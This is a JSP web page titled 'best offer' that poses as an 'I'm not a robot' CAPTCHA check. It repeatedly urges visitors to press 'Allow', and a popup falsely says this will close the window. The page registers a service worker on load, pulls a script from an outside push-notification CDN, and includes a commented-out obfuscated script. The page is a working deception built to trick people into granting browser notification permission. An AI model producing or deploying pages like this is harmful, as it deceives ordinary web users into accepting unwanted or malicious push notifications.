<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>best offer</title>
</head>


<body style="-webkit-font-smoothing: antialiased;min-height: 100%;margin: 0;padding: 0;background-image: url(resources/img/robo_man.jpeg);background-size: 300px 330px;background-position: 100% 25%; background-repeat: no-repeat;color: #fff;font-family: Arial, Helvetica, sans-serif;text-align: center;" onload="registerSw()" onmouseleave="checkMouse(this)">


<%--<script src="resources/obfuscated.js"></script>--%>

<script src="//cdn.letreach.com/js/main/0caf2730572a127dbbe6493780d7e009.js"></script>

<style>
    @-webkit-keyframes float {
        0% {
            -webkit-transform: translate(-50%, 5px);
            transform: translate(-50%, 5px)
        }
        50% {
            -webkit-transform: translate(-50%, -5px);
            transform: translate(-50%, -5px)
        }
        to {
            -webkit-transform: translate(-50%, 5px);
            transform: translate(-50%, 5px)
        }
    }

    @keyframes float {
        0% {
            -webkit-transform: translate(-50%, 5px);
            transform: translate(-50%, 5px)
        }
        50% {
            -webkit-transform: translate(-50%, -5px);
            transform: translate(-50%, -5px)
        }
        to {
            -webkit-transform: translate(-50%, 5px);
            transform: translate(-50%, 5px)
        }
    }

    @-webkit-keyframes floatcenter {
        0% {
            -webkit-transform: translate(0, 5px);
            transform: translate(0, 5px)
        }
        50% {
            -webkit-transform: translate(0, -5px);
            transform: translate(0, -5px)
        }
        to {
            -webkit-transform: translate(0, 5px);
            transform: translate(0, 5px)
        }
    }

    @keyframes floatcenter {
        0% {
            -webkit-transform: translate(0, 5px);
            transform: translate(0, 5px)
        }
        50% {
            -webkit-transform: translate(0, -5px);
            transform: translate(0, -5px)
        }
        to {
            -webkit-transform: translate(0, 5px);
            transform: translate(0, 5px)
        }
    }

    @media (max-width: 520px) {
        .c1 {
            padding: 140px 20px 20px !important;
            text-align: center !important;
        }

        .c2 {
            display: none !important;
        }

        .c3 {
            top: 72px !important;
            left: 38% !important;
        }

    }

    @media (max-width: 700px) {
        .c5 {
            width: 400px !important;
            left: calc(50% - 240px) !important;
        }
    }

    @media (max-width: 950px) {
        .c4 {
            display: block;
            top: 20px !important;
            left: calc(50% - 115px) !important;
            -webkit-animation: floatcenter 1s ease-in-out infinite !important;
            animation: floatcenter 1s ease-in-out infinite !important;
        }
    }

    @media (max-width: 500px) {
        .c4 {
            bottom: 3% !important;
            top: unset !important;
            width: 80%;
            left: unset !important;
            right: 5%;
        }
    }
</style>


<div style="display: inline-block;position: relative;margin: 20% 3% 0;padding: 5px 130px 30px 100px;border: 2px solid #d7d7d7;
      border-radius: 3px;background-color: #f9f9f9;color: #000;text-align: left;" class="c1">

    <div style="background-image: url(resources/img/icon_dir.png); background-size: cover; background-repeat:no-repeat;left: 25px;width: 60px;height: 45px;position: absolute;
        top: 50%;-webkit-transform: translateY(-50%);transform: translateY(-50%);" class="c2">
    </div>

    <div style="margin-bottom: 5px;font-size: 24px;font-weight: 700;">
        <div style="margin-top: 20px; font-size: 24px; font-weight: 700">I'am not a robot</div>
        <div style="color: #676767; margin-top: 4px; font-size: 15px;">Press <span style="font-weight: 700">Allow</span> to verify your're not a robot
        </div>
    </div>

    <div style="background-image: url(resources/img/capcha.png); background-size: cover; background-repeat:no-repeat;right: 20px;width: 81px;height: 90px;position: absolute;
        top: 50%;-webkit-transform: translateY(-50%);transform: translateY(-50%);" class="c3">
    </div>
</div>

<div id="popup"
     style="display:none;position: fixed;top: 0;right: 0;bottom: 0;left: 0;background: rgba(0,0,0,.8);z-index: 99;">
    <div class="c5"
         style="z-index: 1;position: absolute;top: 0;right: 20px;left: 460px;max-width: 600px;padding: 40px;background: #fff;-webkit-box-shadow: 0 5px 10px rgba(0,0,0,.5);box-shadow: 0 5px 10px rgba(0,0,0,.5);color: #000;text-align: left;">
        <p style="font-weight: 700">Press "Allow" to close the window</p>
        <p style="font-size: 14px">You can close the window by pressing "Allow". If you want to continue just click "Detailed Information".</p>
        <p style="color: #009cff; font-size: 14px">Detailed Information</p>
    </div>
</div>

<div class="c4" style="height: 20px; z-index: 1;position: fixed;top: 120px;left: 390px;padding: 20px;border-radius: 10px;background: #fff;color: #000;
    -webkit-box-shadow: 0 5px 30px rgba(0, 0, 0, .2);box-shadow: 0 5px 30px rgba(0, 0, 0, .2);
    font-size: 20px;font-weight: 700;text-align: center;text-transform: none;
    -webkit-animation: float 1s ease-in-out infinite;animation: float 1s ease-in-out infinite">
    Press <span style="color: #197aec">Allow</span> to verify
</div>


</body>
</html>
